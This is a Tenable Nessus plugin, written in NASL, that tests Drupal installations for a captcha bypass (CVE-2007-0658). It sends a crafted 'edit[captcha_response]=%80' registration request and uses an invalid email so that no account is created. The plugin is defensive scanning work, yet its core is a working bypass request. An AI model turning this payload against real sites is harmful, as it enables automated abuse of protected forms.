#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24264);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-0658");
  script_bugtraq_id(22329);
  script_xref(name:"OSVDB", value:"32137");
  script_xref(name:"OSVDB", value:"32138");

  script_name(english:"Drupal Multiple Module $_SESSION Manipulation CAPTCHA Bypass");
  script_summary(english:"Tries to bypass captcha when registering as a new user in Drupal");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
security bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of Drupal installed on the remote host includes at least
one third-party module that adds a 'captcha' to various forms such as
for user registration but which can be bypassed using a specially-
crafted 'edit[captcha_response]' parameter.  As a result, an attacker
can script access to whatever forms the module is designed to protect
from automated abuse." );
 script_set_attribute(attribute:"see_also", value:"http://drupal.org/node/114364" );
 script_set_attribute(attribute:"see_also", value:"http://drupal.org/node/114519" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Drupal captcha module version 4.7-1.2 / 5.x-1.1 and/or
textimage module version 4.7-1.2 / 5.x-1.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );


script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/drupal"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/user/register");
  r = http_send_recv3(port:port, method: "GET", item: url);
  if (isnull(r)) exit(0);

  # If it does and uses a captcha...
  if (
    ' name="op" value="Create new account"' >< r[2] &&
    ' name="edit[captcha_response]"' >< r[2]
  )
  {
    # Try to bypass the captcha when registering.
    user = string(SCRIPT_NAME, "-", unixtime());
    postdata = string(
      "edit[captcha_response]=%80&",
      "edit[name]=", user, "&",
      # nb: this causes the registration to fail!
      "edit[mail]=", user, "&",
      "edit[form_id]=user_register&",
      "op=Create+new+account"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    r = http_send_recv3(method: "POST", port:port, version: 11, item: url, data: postdata, add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # There's a problem if it looks like the registration is ok
    # except for the email address.
    if (
      string("The e-mail address <em>", user, "</em> is not valid.") >< r[2] &&
      (
        # nb: error if captcha type is 'captcha'.
        "The answer you entered to the math problem is incorrect." >!< r[2] &&
        # nb: error if captcha type is 'textimage'.
        "The image verification code you entered is incorrect" >!< r[2]
      )
    )
    {
      security_warning(port);
      exit(0);
    }
  }
}
